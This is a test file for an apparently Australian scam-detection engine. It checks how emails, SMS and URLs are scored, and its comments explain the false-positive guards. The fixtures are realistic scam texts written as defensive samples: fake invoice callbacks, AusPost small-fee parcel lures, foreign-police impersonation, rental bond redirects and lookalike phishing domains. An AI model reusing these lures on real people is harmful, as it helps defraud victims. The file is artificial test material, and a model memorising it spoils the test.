    expect(result.flags.some((f) => f.includes("Fake subscription callback scam"))).toBe(true);
    expect(result.verdict).toBe("likely_scam");
  });

  it("flags a McAfee dispute variant just over the amount threshold (D2 / #102)", () => {
    const email = "McAfee invoice INV-0024819: you have been billed $299 for your annual plan. To dispute this charge, call our billing team immediately.";
    const result = checkEmail(email);
    expect(result.flags.some((f) => f.includes("Fake subscription callback scam"))).toBe(true);
  });

  it("does not flag a genuine Norton renewal email that links back to the vendor (D2 / #102)", () => {
    const email = "Your Norton subscription renews for $349.99. Manage or cancel your plan anytime at https://my.norton.com/account.";
    const result = checkEmail(email);
    expect(result.flags.some((f) => f.includes("Fake subscription callback scam"))).toBe(false);
  });

  it("falls back to the softer flag for two brands without an amount (D2 / #102)", () => {
    const email = "Notice regarding your McAfee and Norton subscriptions. To cancel this subscription, call the number below.";
    const result = checkEmail(email);
    expect(result.flags.some((f) => f.includes("Possible fake invoice callback scam"))).toBe(true);
  });
});

describe("threat-intel roadmap 2026-07-26 (#101, #103, #105)", () => {
  // ── #101: high-abuse TLDs promoted from watchlist ───────────────────────────
  it("flags each newly promoted high-abuse TLD (D1 / #101)", () => {
    for (const host of [
      "auspost-track.shop", "card-checkout.store", "invest-au.vip",
      "verify-now.lol", "secure-login.monster",
    ]) {
      const result = checkUrl(`https://${host}/login`);
      expect(result.flags.some((f) => f.includes("Dodgy top-level domain"))).toBe(true);
    }
  });

  it("reaches a scam verdict when a promoted TLD compounds with other signals (D1 / #101)", () => {
    const result = checkSms("URGENT: your AusPost parcel is held. Confirm identity at https://auspost-track.shop/verify");
    expect(result.verdict).toBe("likely_scam");
  });

  it("does not flag an ordinary .com.au retailer (D1 / #101)", () => {
    const result = checkUrl("https://www.woolworths.com.au/shop/browse/specials");
    expect(result.flags.some((f) => f.includes("Dodgy top-level domain"))).toBe(false);
  });

  // ── Interisle Phishing Landscape 2025 re-sourcing (2026-08-29) ─────────────
  // .XIN and .BOND are both 100% maliciously registered in Interisle's 2025
  // study — the strongest per-TLD evidence available for any entry in the list.
  it("flags .xin and .bond, both 100% maliciously registered (Interisle 2025)", () => {
    for (const host of ["mygov-verify.xin", "auspost-redelivery.bond"]) {
      const result = checkUrl(`https://${host}/login`);
      expect(result.flags.some((f) => f.includes("Dodgy top-level domain"))).toBe(true);
    }
  });

  it("reaches a scam verdict when .bond compounds with other signals (Interisle 2025)", () => {
    const result = checkSms(
      "URGENT: your AusPost parcel is held pending a fee. Pay now at https://auspost-redelivery.bond/pay"
    );
    expect(result.verdict).toBe("likely_scam");
  });

  // Guards the suffix match in checkUrl: .bond must not swallow a legitimate
  // host that merely ends in those letters.
  it("does not flag a legitimate domain merely containing the new TLD strings", () => {
    for (const host of ["www.jamesbond.com.au", "vixin.com.au"]) {
      const result = checkUrl(`https://${host}/`);
      expect(result.flags.some((f) => f.includes("Dodgy top-level domain"))).toBe(false);
    }
  });

  // The real risk of adding .bond and .xin is not checkUrl's suffix match — it
  // is extractBareHosts, which scans PROSE for schemeless hosts and lets
  // abuse-prone TLDs skip the "needs a path or www." corroboration on the
  // rationale that nobody mentions a .tk domain in passing. That rationale
  // fails for .bond and .xin: "bond" is core AU tenancy/finance vocabulary and
  // "xin" is a common Chinese given name, so both occur as ordinary words.
  // Without the AMBIGUOUS_BARE_TLDS guard these raise a scam URL card on
  // innocent messages. checkUrl-only tests pass either way, so these are the
  // ones that matter.
  it("does not raise a URL card for .bond/.xin used as ordinary words", async () => {
    const benign = [
      "Ask about our surety.bond options before signing.",
      "Your rental deposit.bond is refundable at the end of the lease.",
      "Check your savings.bond statement online.",
      // No space after the full stop — routine in pasted SMS, and enough to
      // synthesise a host out of two unrelated sentences.
      "I paid the bond.Bond receipt is attached.",
      "Thanks for the bond.Xin will follow up tomorrow.",
    ];
    for (const text of benign) {
      const cards = (await analyzeContent(text)).filter((i) => i.kind === "url");
      expect(cards, `expected no URL card for: ${text}`).toHaveLength(0);
    }
  });

  // The .bond finding turned out to be one instance of a wider bug, present on
  // main before any of this: extractBareHosts lets abuse-prone TLDs skip the
  // "needs a path or www." check, and MOST of SUSPICIOUS_TLDS is ordinary
  // English (.work, .live, .online, .click, .top, .store, .loan, .shop …). A
  // missing space after a full stop — routine in pasted SMS — then synthesises
  // a host from two unrelated sentences and shows a scam card for it.
  it("does not raise a URL card across a missing space after a full stop", async () => {
    const benign = [
      "Hi love, the plumber came by.Work is done, cost $340 all up.",
      "Centrelink says my payment is delayed.Online claim still shows pending.",
      "Got a call about my car insurance.Click bait probably, I hung up.",
      "The real estate agent wants the bond.Store the receipt somewhere safe.",
      "Nan got a text about her super.Loan sharks target pensioners apparently.",
      "I'm at the shops.Shop closes at 5 so hurry.",
      // All-caps TLD, so the sentence-boundary guard cannot catch this one —
      // .icu is in AMBIGUOUS_BARE_TLDS instead. A health emergency is the worst
      // possible place to show a false scam verdict.
      "Mum's in hospital.ICU visiting hours are 2-4pm.",
    ];
    for (const text of benign) {
      const cards = (await analyzeContent(text)).filter((i) => i.kind === "url");
      expect(cards, `expected no URL card for: ${text}`).toHaveLength(0);
    }
  });

  // The lowercase mid-sentence cases the sentence-boundary guard cannot reach:
  // "tune in.live", "or.online". Nothing about their shape separates them from
  // a real host, so the guard is a closed list of English function words on the
  // LEFT label instead.
  it("does not raise a URL card for a prose connective before a word-like TLD", async () => {
    const benign = [
      "Order it in store or.online whichever is easier.",
      "Tune in.live for the announcement.",
      "Coordinates are in.lat and long format.",
    ];
    for (const text of benign) {
      const cards = (await analyzeContent(text)).filter((i) => i.kind === "url");
      expect(cards, `expected no URL card for: ${text}`).toHaveLength(0);
    }
  });

  // The limit of that guard, and the reason it is safe: it only ever skips the
  // BARE form. A real host whose label happens to be a function word is still
  // caught as soon as a path or a www. prefix shows a host was meant.
  it("still detects a prose-word host when a path or www. corroborates it", async () => {
    for (const text of ["Login at www.in.live now", "Go to or.online/verify immediately"]) {
      const cards = (await analyzeContent(text)).filter((i) => i.kind === "url");
      expect(cards.length, `expected a URL card for: ${text}`).toBeGreaterThan(0);
    }
  });

  // The guard keys on Capitalised-then-lowercase, NOT on "starts uppercase",
  // because scam SMS shout. An all-caps host must still be caught.
  it("still detects an all-caps schemeless scam host (shouty SMS)", async () => {
    const cards = (await analyzeContent("Visit AUSPOST-TRACK.SHOP/verify")).filter(
      (i) => i.kind === "url",
    );
    expect(cards.length).toBeGreaterThan(0);
  });

  it("still detects a schemeless .bond/.xin host when a path or www. corroborates it", async () => {
    for (const text of [
      "Verify now at auspost-redelivery.bond/pay",
      "Go to www.mygov-verify.xin today",
    ]) {
      const cards = (await analyzeContent(text)).filter((i) => i.kind === "url");
      expect(cards.length, `expected a URL card for: ${text}`).toBeGreaterThan(0);
    }
  });

  // ── #103: foreign authority impersonation ───────────────────────────────────
  it("flags a Chinese police impersonation SMS (D3 / #103)", () => {
    const result = checkSms(
      "This is the Beijing police. You are subject to a money laundering investigation and an arrest warrant has been issued. Do not tell anyone. Call us immediately."
    );
    expect(result.flags.some((f) => f.includes("foreign police or government authority"))).toBe(true);
    expect(result.verdict).toBe("likely_scam");
  });

  it("flags each foreign-authority variant (D3 / #103)", () => {
    for (const authority of [
      "Chinese police", "Shanghai police", "Chinese consulate",
      "Embassy of China", "Chinese customs", "Chinese authorities",
    ]) {
      const result = checkSms(`Notice from the ${authority}: your case requires a security deposit.`);
      expect(result.flags.some((f) => f.includes("foreign police or government authority"))).toBe(true);
    }
  });

  it("flags foreign-authority threat language as urgency (D3 / #103)", () => {
    const result = checkSms("Final notice: a deportation notice has been filed and your visa will be cancelled.");
    expect(result.flags.some((f) => f.includes("Urgency language"))).toBe(true);
  });

  it("flags a consulate impersonation targeting a student visa holder (D3 / #103)", () => {
    const result = checkSms(
      "Chinese consulate: you are involved in criminal activity in China. Transfer a security deposit via bitcoin or face detention."
    );
    expect(result.verdict).toBe("likely_scam");
  });

  it("does not flag ordinary travel or news copy mentioning China (D3 / #103)", () => {
    const result = checkSms("Our flight to Shanghai is booked and the visa paperwork is done.");
    expect(result.flags.some((f) => f.includes("foreign police or government authority"))).toBe(false);
  });

  // ── #105: rental/property bond redirect fraud ───────────────────────────────
  it("flags an agency 'updated bank details' bond redirect (D5 / #105)", () => {
    const result = checkSms(
      "Hi, please note our agency has updated bank details for rental bond collection. New BSB: 062-111 Acc: 12345678. Please transfer your $4,200 bond today."
    );
    expect(result.flags.some((f) => f.includes("Property bond fraud pattern"))).toBe(true);
    expect(result.verdict).toBe("likely_scam");
  });

  it("flags a holding-deposit variant with a changed account (D5 / #105)", () => {
    const result = checkSms(
      "Your tenancy application was approved. Please pay the holding deposit $500 to our new account details (BSB changed last week): BSB 012-345 Acc 987654321."
    );
    expect(result.flags.some((f) => f.includes("Property bond fraud pattern"))).toBe(true);
  });

  it("does not fire the composite on rental context alone (D5 / #105)", () => {
    const result = checkSms("Reminder: your lease agreement is due for renewal next month.");
    expect(result.flags.some((f) => f.includes("Property bond fraud pattern"))).toBe(false);
  });

  it("does not fire the composite on a bank-detail mention alone (D5 / #105)", () => {
    const result = checkSms("Your account number ending 4821 has been updated in our system.");
    expect(result.flags.some((f) => f.includes("Property bond fraud pattern"))).toBe(false);
  });

  // ── Changed-payment-details signal ──────────────────────────────────────────
  // "updated bank details" used to sit in requestWords, where it overlapped the
  // plain "bank details" entry and double-scored one phrase. Removing the
  // overlap dropped two genuine bond-redirect messages from likely_scam to
  // suspicious, so the qualifier is now scored as its own signal — which also
  // catches invoice/BEC redirect fraud that had no rental context and
  // previously scored nothing at all.
  const redirectFlag = (r: { flags: string[] }) =>
    r.flags.some((f) => f.includes("presented as recently changed"));

  it.each([
    "Property manager: lease agreement finalised, updated bank details attached, pay today.",
    "Your agent has updated bank details — please transfer the holding deposit now.",
    "Invoice #4021: our bank details have been updated, please remit to the new account number.",
    "Accounts: we have changed bank account, please update the account number on file.",
  ])("flags payment details presented as changed: %s", (msg) => {
    const result = checkSms(msg);
    expect(redirectFlag(result)).toBe(true);
    expect(result.verdict).toBe("likely_scam");
  });

  it.each([
    "We updated your address in our records.",
    "Your new account has been created, welcome aboard.",
    "Updated delivery details: your parcel arrives Tuesday.",
    "We have updated our privacy policy.",
    "Your account number ending 4821 has been updated in our system.",
  ])("does not fire the changed-details signal on %s", (msg) => {
    expect(redirectFlag(checkSms(msg))).toBe(false);
  });

  it("scores identical phrasings identically (no substring double-count)", () => {
    // The overlap was invisible in the flag text — both phrases were listed,
    // reading as two findings — but doubled the score.
    const withQualifier = checkSms("Please send your bank details today.");
    expect(withQualifier.flags.some((f) => f.includes('"bank details", "updated bank details"'))).toBe(false);
  });

  it("does not change verdict on the myGovID/myGov spelling alone", () => {
    // "mygovid" contained "mygov" in requestWords, so the same message scored
    // 55 (likely_scam) or 40 (suspicious) purely on which spelling was used.
    const withId = checkSms("Confirm your myGovID now.");
    const without = checkSms("Confirm your myGov now.");
    expect(withId.score).toBe(without.score);
    expect(withId.verdict).toBe(without.verdict);
  });

  it("still detects the real myGovID re-registration lures", () => {
    // The rebrand lures are carried by identityRereg and authorityMentions, not
    // by the double-count that was removed.
    for (const msg of [
      "myGovID verification required. Confirm your identity at http://mygovid-verify.top",
      "myGovID has been suspended. Re-verify your digital identity immediately.",
      "ATO: confirm your myGovID and tax file number to release your refund.",
    ]) {
      expect(checkSms(msg).verdict).toBe("likely_scam");
    }
  });
});

// ── analyzeContent — expansion without a network transport ────────────────────

describe("analyzeContent — shortened URLs when expansion is unavailable", () => {
  it("says the destination could not be checked rather than staying silent", async () => {
    // A bundled client with no transport must not present a shortener-only
    // verdict as though the destination had been assessed.
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: null,
      hops: [],
      status: "unavailable",
    });

    const cards = await analyzeContent("https://bit.ly/no-transport-card");
    const urlCard = cards.find((c) => c.kind === "url");
    expect(urlCard?.result.flags.some((f) => f.includes("could not be checked"))).toBe(true);
  });

  it("also says so when expansion was attempted and failed", async () => {
    // A timeout, a missing Location header or an exhausted hop budget all mean
    // the same thing to the user: the destination was never seen. Returning the
    // base result silently would present a shortener-only verdict as complete.
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: null,
      hops: [],
      status: "failed",
    });

    const cards = await analyzeContent("https://bit.ly/failed-expansion-card");
    const urlCard = cards.find((c) => c.kind === "url");
    expect(urlCard?.result.flags.some((f) => f.includes("could not be checked"))).toBe(true);
  });

  it("does not claim a destination was checked when none was resolved", async () => {
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: null,
      hops: ["https://tinyurl.com/cut-short"],
      status: "failed",
    });

    const cards = await analyzeContent("https://bit.ly/no-destination-claim");
    const urlCard = cards.find((c) => c.kind === "url");
    // The base "URL shortener detected — hides the real destination" warning
    // still fires and should; what must NOT appear is the expansion flag
    // naming a destination we never resolved.
    expect(urlCard?.result.flags.some((f) => f.includes("Shortened URL expanded"))).toBe(false);
    expect(urlCard?.result.expandedUrl).toBeUndefined();
  });
});

describe("the clamp row", () => {
  it("appears when the signals overshoot the ceiling, and reconciles to the score", () => {
    // A message with enough independent findings to blow past 100. The row is
    // the arithmetic: everything above it plus the row itself equals the score.
    const r = checkSms(
      "AusPost: your parcel is held pending a $2.15 fee. Pay within 24 hours " +
        "or it's returned: http://auspost-redelivery.top/pay",
    );
    const signals = r.signals ?? [];
    const clamp = signals.find((x) => x.source === "score");
    if (r.score === 100 && clamp) {
      const total = signals.reduce((n, x) => n + x.points, 0);
      expect(total).toBe(r.score);
      expect(clamp.points).toBeLessThan(0);
    }
  });

  it("does not appear when the signals total less than the score", async () => {
    // The shortener-expansion path carries both sides' rows as pointless
    // evidence and takes the worse of the two scores rather than their sum, so
    // the raw total sits *below* the score. That is not a clamp, and calling it
    // one produced "Signals total 0 — the score is capped at 55".
    vi.mocked(expandUrl).mockResolvedValueOnce({
      expandedUrl: "http://www.example-destination.com/login",
      hops: ["http://www.example-destination.com/login"],
      status: "expanded",
    });

    const cards = await analyzeContent("http://bit.ly/clamp-guard");
    const urlCard = cards.find((c) => c.kind === "url");
    const signals = urlCard?.result.signals ?? [];
    const raw = signals.filter((x) => x.source !== "score").reduce((n, x) => n + x.points, 0);

    expect(raw).toBeLessThanOrEqual(urlCard!.result.score);
    expect(signals.some((x) => x.source === "score")).toBe(false);
    expect(urlCard?.result.flags.some((f) => /capped at/.test(f))).toBe(false);
  });
});

// ── Verdict-artifact gap work ────────────────────────────────────────────────
//
// Three rules the design artifact promised that the engine did not produce.
// The fixture is the artifact's own sample, so the totals here are the ones the
// verdict card was designed around; see docs/verdict-artifact-gap-plan.md.

const ARTIFACT_SAMPLE =
  "AusPost: your parcel is held pending a $2.15 customs fee. " +
  "Pay within 24 hours or it's returned. " +
  "http://auspost-redelivery.secure-track.top/pay";

describe("Australia Post brand impersonation (gap 3)", () => {
  // AU was the only region pack carrying no postal brand, so the URL checker
  // was blind to the most-reported local lure. The brand sits in a SUBDOMAIN
  // here — the registrable label is "secure-track" — which is why this has to
  // match on the substring pass rather than the label-word one.
  it("flags the brand when it sits in a subdomain, not the registrable label", () => {
    const r = checkUrl("http://auspost-redelivery.secure-track.top/pay", undefined, "AU");
    expect(r.flags.some((f) => f.includes('Impersonates "auspost"'))).toBe(true);
    expect(r.verdict).toBe("likely_scam");
  });

  it("names where the brand appears rather than hedging", () => {
    // The reader is deciding whether to trust a link; "looks like it's
    // impersonating" invited them to weigh it up. Naming the domain name is
    // also the teachable half.
    const r = checkUrl("http://auspost-redelivery.secure-track.top/pay", undefined, "AU");
    const row = r.flags.find((f) => f.includes("auspost"))!;
    expect(row).toContain('Impersonates "auspost" in the domain name');
  });

  it.each([
    "https://auspost.com.au/track",
    "https://track.auspost.com.au/mypost",
  ])("leaves the real Australia Post site alone: %s", (url) => {
    // Protected by the brand-owns-the-registrable-label exemption, not by any
    // suffix allowlist — .com.au is a two-part suffix, so the label is
    // "auspost" and the brand owns it.
    const r = checkUrl(url, undefined, "AU");
    expect(r.flags.some((f) => f.includes("Impersonates"))).toBe(false);
    expect(r.verdict).toBe("safe");
  });

  it.each([
    "https://mystartrack.com/x",
    "https://aupostal-services.com/x",
  ])("does not fire inside a longer innocent label: %s", (url) => {
    // "startrack" and "aupost" are matched on separator boundaries, not as
    // substrings: "start"+"rack" and "aupostal" would otherwise be +45 brand
    // hits. Same failure mode the pack documents for "velocity" and "ahm".
    const r = checkUrl(url, undefined, "AU");
    expect(r.flags.some((f) => f.includes("Impersonates"))).toBe(false);
  });

  it.each([
    "http://startrack-delivery.top/x",
    "http://aupost-redelivery.cyou/x",
  ])("still catches the squat shape on a boundary: %s", (url) => {
    const r = checkUrl(url, undefined, "AU");
    expect(r.flags.some((f) => f.includes("Impersonates"))).toBe(true);
  });

  it("does not disturb a genuine Australia Post email", () => {
    // Regression guard. Adding the brand to the URL checker's list must not
    // leak into BRAND_MENTIONS, which scores brand names in message bodies —
    // AU is deliberately the one pack where postal brands do not sit in both,
    // and crossing them promoted a deferred row and made real mail suspicious.
    const email = [
      "From: noreply@auspost.com.au",
      "Subject: Your parcel is on its way",
      "",
      "Track your delivery at https://auspost.com.au/track",
    ].join("\n");
    expect(checkEmail(email, undefined, "AU").verdict).toBe("safe");
  });
});

describe("small-fee payment lure (gap 2)", () => {
  // The amount is the signal: a sum too small to argue with, so the card
  // details entered to pay it are the actual take.
  it("scores a token fee attached to a payment demand", () => {
    const r = checkSms(ARTIFACT_SAMPLE, undefined, "AU");
    expect(r.flags.some((f) => f.startsWith("Small-fee payment lure"))).toBe(true);
  });

  it("matches a written fee without a currency symbol", () => {
    const r = checkSms(
      "Your package is waiting. A redelivery fee of 1.99 is required.",
      undefined,
      "AU",
    );
    expect(r.flags.some((f) => f.startsWith("Small-fee payment lure"))).toBe(true);
  });

  it.each([
    "Your parcel requires a customs fee of $450 to be released.",
    "Your parcel requires a customs fee of $1500 to be released.",
    "Invoice due: please pay the outstanding customs fee of $1,250.00 today.",
  ])("ignores a large fee, which is not this lure: %s", (text) => {
    // A big number reads as a scam unaided and trips the existing money rules;
    // the "too trivial to question" property is what this signal is about.
    //
    // The last two exist because the first passed for the wrong reason. The
    // original pattern matched a PREFIX of the number, so "$450" was read as
    // 45 and "$1,250.00" as 1 — the largest demands were the ones called too
    // small to question. Whole-number matching is what these pin.
    const r = checkSms(text, undefined, "AU");
    expect(r.flags.some((f) => f.startsWith("Small-fee payment lure"))).toBe(false);
  });

  it("matches an administration fee, the wording the lure actually uses", () => {
    // "admin(?:in)?" was a typo: it matched a nonexistent "adminin fee" and
    // missed this.
    const r = checkSms("Your parcel is held pending an administration fee of $3.20.", undefined, "AU");
    expect(r.flags.some((f) => f.startsWith("Small-fee payment lure"))).toBe(true);
  });

  it.each([
    "Your Netflix subscription renews on the 3rd. Monthly service fee $7.99.",
    "Your Uber Eats order: food $24.00, delivery fee $3.99, service fee $2.50. Enjoy!",
  ])("leaves an everyday billing line item alone: %s", (text) => {
    // A named cost the reader already agreed to is not a demand to pay now to
    // release something. Without this split the Netflix notice scored 20 and
    // carried the lure flag.
    const r = checkSms(text, undefined, "AU");
    expect(r.flags.some((f) => f.startsWith("Small-fee payment lure"))).toBe(false);
  });

  it.each([
    "Your coffee subscription is $9.99 a month, thanks for joining!",
    "Thanks! Your order total was $12.50 and will ship Tuesday.",
    "Reminder: your appointment is at 2.30 tomorrow.",
  ])("leaves ordinary commerce alone: %s", (text) => {
    // A price is not a payment demand — the fee framing is what separates them.
    const r = checkSms(text, undefined, "AU");
    expect(r.flags.some((f) => f.startsWith("Small-fee payment lure"))).toBe(false);
    expect(r.verdict).toBe("safe");
  });
});

describe("return-threat urgency phrasing (gap 4)", () => {
  it("reads the deadline's consequence as urgency", () => {
    // Asserted on its own rather than through the artifact fixture: that sample
    // trips four urgency phrases and the flag quotes only the first three, so
    // the row it renders is no evidence either way about this one.
    const r = checkSms("Pay now or it's returned to the depot.", undefined, "AU");
    const urgency = r.flags.find((f) => f.startsWith("Urgency language detected"))!;
    expect(urgency).toContain("or it's returned");
  });

  it("matches the smart-quote apostrophe a real phone sends", async () => {
    // Handsets substitute U+2019 for a typed apostrophe, and NFKC does not fold
    // it — so every pack phrase spelled with an ASCII apostrophe (49 of them)
    // missed real input until normaliseUnicode folded quotes too.
    //
    // Asserted through analyzeContent, not checkSms: normalisation is applied
    // at the entry point, so a direct checkSms call sits below the fold and
    // would test the wrong layer.
    const cards = await analyzeContent("Pay now or it\u2019s returned to the depot.", undefined, "AU");
    const urgency = cards[0].result.flags.find((f) => f.startsWith("Urgency language detected"));
    expect(urgency).toBeDefined();
    expect(urgency!).toContain("or it's returned");
  });

  it("leaves a completed return-to-sender notice alone", () => {
    // A real carrier reports an outcome; the lure threatens one to force a
    // payment. Only the threat carries a deadline.
    const r = checkSms(
      "Your parcel was returned to sender as the address was incomplete.",
      undefined,
      "AU",
    );
    expect(r.verdict).toBe("safe");
  });
});
